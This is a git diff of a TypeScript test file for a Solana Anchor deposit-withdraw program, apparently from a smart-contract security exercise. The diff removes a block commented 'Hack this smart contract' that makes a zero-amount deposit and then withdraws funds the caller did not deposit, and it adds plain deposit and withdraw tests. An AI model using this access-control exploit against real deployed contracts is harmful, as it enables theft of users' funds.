@@ -1,6 +1,7 @@
 import * as anchor from "@coral-xyz/anchor";
 import { Program } from "@coral-xyz/anchor";
 import { DepositWithdraw } from "../target/types/deposit_withdraw";
+import { LAMPORTS_PER_SOL } from "@solana/web3.js";
 
 describe("deposit-withdraw", () => {
   // Configure the client to use the local cluster.
@@ -11,23 +12,8 @@ describe("deposit-withdraw", () => {
 
   const program = anchor.workspace.DepositWithdraw as Program<DepositWithdraw>;
 
-  const authority = new anchor.web3.Keypair();
+  const authority = wallet;
   const amount = 1_000_000;
-
-  before(async() => {
-    const transferAmount = 1 * anchor.web3.LAMPORTS_PER_SOL;
-    const transferTx = new anchor.web3.Transaction().add(
-        anchor.web3.SystemProgram.transfer({
-            fromPubkey: provider.wallet.publicKey,
-            toPubkey: authority.publicKey,
-            lamports: transferAmount,
-        })
-    );
-
-    await provider.sendAndConfirm(
-        transferTx,
-    );
-  })
 
   it("Deposit", async () => {
 
@@ -38,41 +24,46 @@ describe("deposit-withdraw", () => {
     const transactionSignature = await anchor.web3.sendAndConfirmTransaction(
         connection,
         transaction,
-        [authority],
+        [authority.payer],
         { commitment: "confirmed"}
     );
 
     console.log("Transaction Signature: ", transactionSignature);
-
-
-    // Hack this smart contract
-
-    const exploitTransaction = await program.methods.deposit(new anchor.BN(0))
-    .accounts({depositor: wallet.publicKey})
-    .transaction();
-
-    const exploitSignature = await anchor.web3.sendAndConfirmTransaction(
-        connection,
-        exploitTransaction,
-        [wallet.payer],
-        { commitment: "confirmed"}
-    );
-
-    console.log("Transaction Signature: ", exploitSignature);
-
-    const withDrawInstruction = await program.methods.withdraw(new anchor.BN(amount))
-        .accounts({authority: wallet.publicKey})
-        .instruction();
-
-    const withdrawExploitTx = new anchor.web3.Transaction().add(withDrawInstruction);
-
-    const exploitWithdraw = await anchor.web3.sendAndConfirmTransaction(
-        connection,
-        withdrawExploitTx,
-        [wallet.payer],
-        { commitment: "confirmed"}
-    );
-
-    console.log("Transaction Signature: ", exploitWithdraw);
   });
+
+  it("Withdraw", async () => {
+
+    // const withDrawInstruction = await program.methods.withdraw(new anchor.BN(amount))
+    //     .accounts({authority: wallet.publicKey})
+    //     .instruction();
+
+    // const withdrawTx = new anchor.web3.Transaction().add(withDrawInstruction);
+
+    const [pda, bump] = await anchor.web3.PublicKey.findProgramAddressSync(
+        [Buffer.from("deposit")],
+        program.programId
+    );
+
+    const bank_balance = await program.account.bank.fetch(pda);
+    console.log(`Bank Balance: ${bank_balance.bankBalance.toNumber() / LAMPORTS_PER_SOL} SOL`);
+
+    const withdrawTransaction = await program.methods
+        .withdraw(new anchor.BN(amount))
+        .accounts({
+            authority: wallet.publicKey,
+        })
+        .transaction();
+
+        const transactionSignature = await anchor.web3.sendAndConfirmTransaction(
+            connection,
+            withdrawTransaction,
+            [wallet.payer],
+            { commitment: "confirmed" }
+        );
+
+    console.log("Transaction Signature: ", transactionSignature);
+
+    
+  })
+
 });
